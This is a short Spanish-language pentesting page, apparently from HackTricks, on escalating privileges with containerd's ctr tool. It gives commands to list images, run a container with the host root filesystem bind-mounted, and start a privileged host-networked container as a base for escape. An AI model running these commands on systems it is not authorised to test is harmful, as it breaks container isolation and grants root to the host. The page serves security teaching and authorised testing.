# Escalación de privilegios de Containerd (ctr)

{{#include ../../banners/hacktricks-training.md}}

## Información básica

Ve al siguiente enlace para aprender **qué es containerd** y `ctr`:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE 1

si encuentras que un host contiene el comando `ctr`:
```bash
which ctr
/usr/bin/ctr
```
Puedes listar las imágenes:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Y luego **ejecuta una de esas imágenes montando la carpeta raíz del host en ella**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Ejecuta un contenedor privilegiado y escapa de él.\
Puedes ejecutar un contenedor privilegiado como:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Luego puedes usar algunas de las técnicas mencionadas en la siguiente página para **escapar de ella abusando de capacidades privilegiadas**:

{{#ref}}
docker-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
